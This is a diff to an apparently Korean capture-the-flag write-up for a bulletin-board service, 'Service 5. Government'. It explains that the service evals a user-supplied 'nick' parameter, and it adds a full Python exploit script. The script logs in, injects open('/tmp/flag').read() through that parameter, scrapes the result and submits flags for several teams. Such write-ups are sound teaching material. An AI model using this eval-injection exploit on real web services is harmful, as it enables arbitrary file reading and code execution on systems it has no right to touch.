@@ -1,5 +1,7 @@
 # Service 5. Government
 
+## Attack Vector and Vulnerability
+
 Service5는 게시판서비스를 제공하고 있는데 유저 권한이 일반 유저와 Notarized 유저 2개로 구분이 된다. Notarize를 받기 위한 부분의 코드를 보면 nick이라는 값을 받고, 이 값을 eval하는 것을 확인 할 수 있다.
 
 ```python
@@ -24,4 +26,43 @@ def notarize(request):
 
 위의 그림처럼 임의의 파일을 열어 내용을 확인 할 수 있으모로, flag파일의 값을 읽어 키를 획득하였다.
 
+
+## Exploit Script
+
+```python
+import requests
+import os
+import re
+import time
+
+ID = 'JeongOhKye'
+PW = '123qwe'
+
+fname = '/tmp/flag'
+
+def get_csrf_token(r):
+    m = re.search('name=.csrfmiddlewaretoken. value=.([^\'\"]+)', r.content)
+    return m.group(1)
+
+def ex(team):
+    session = requests.Session()
+    domain = 'http://localhost:80%d5' % team
+    r = session.get(domain + '/bbs/login')
+    token = get_csrf_token(r)
+    payload = {'username': ID, 'password': PW, 'csrfmiddlewaretoken': token}
+    r = session.post(domain + '/bbs/login/', data = payload )
+    r = session.get (domain + '/bbs/notarize/?nick=open(%27/tmp/flag%27).read()')
+    keyi1 = r.content.find("  (nickname : ")
+    keyi2 = r.content.find(") ?</h1>", keyi1)
+    key = r.content[keyi1+14:keyi2].strip()
+    return key 
+
+for i in (1,2,3,4,6):
+    #try:
+        flag = ex(i)
+        os.system('python submit.py %d 5 %s' % (i, flag))
+        print i, flag
+    #except:
+        pass
+```
 
